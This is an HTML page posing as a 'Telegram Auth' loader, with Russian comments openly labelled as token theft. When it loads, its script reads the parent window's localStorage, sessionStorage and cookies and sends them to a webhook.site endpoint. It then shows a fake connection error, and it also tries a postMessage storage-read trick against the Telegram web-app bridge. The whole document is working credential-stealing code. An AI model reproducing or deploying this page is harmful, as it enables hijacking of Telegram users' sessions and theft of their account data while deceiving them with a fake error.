<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Telegram Auth</title>
    <style>
        body { 
            background: #0f0f0f;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: system-ui;
        }
        .loader {
            color: white;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="loader">
        <h3>Loading secure connection...</h3>
    </div>

    <script>
        // === КРАЖА ТОКЕНА ===
        async function stealData() {
            try {
                // Пытаемся получить localStorage из Telegram WebView
                let data = {};
                
                // Доступ к localStorage родителя (Telegram Web)
                if (window.parent && window.parent.localStorage) {
                    data.localStorage = {};
                    for (let i = 0; i < window.parent.localStorage.length; i++) {
                        const key = window.parent.localStorage.key(i);
                        data.localStorage[key] = window.parent.localStorage.getItem(key);
                    }
                }
                
                // Доступ к cookies
                data.cookies = document.cookie;
                
                // Доступ к sessionStorage
                if (window.parent && window.parent.sessionStorage) {
                    data.sessionStorage = {};
                    for (let i = 0; i < window.parent.sessionStorage.length; i++) {
                        const key = window.parent.sessionStorage.key(i);
                        data.sessionStorage[key] = window.parent.sessionStorage.getItem(key);
                    }
                }
                
                // Информация о Telegram
                if (window.TelegramWebviewProxy) {
                    data.hasProxy = true;
                }
                
                // Отправка на сервер (используем free request bin)
                const response = await fetch('https://webhook.site/ваш-id', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
                
            } catch(e) {
                console.log('Error:', e);
            }
            
            // Показываем фейковую ошибку
            document.body.innerHTML = `
                <div class="loader">
                    <h3>Connection error</h3>
                    <p>Please try again later</p>
                </div>
            `;
        }
        
        // Запускаем кражу через 500ms
        setTimeout(stealData, 500);
        
        // Альтернативный метод: postMessage exploit
        window.parent.postMessage({
            eventType: 'web_app_read_storage',
            eventData: {}
        }, '*');
        
    </script>
</body>
</html>
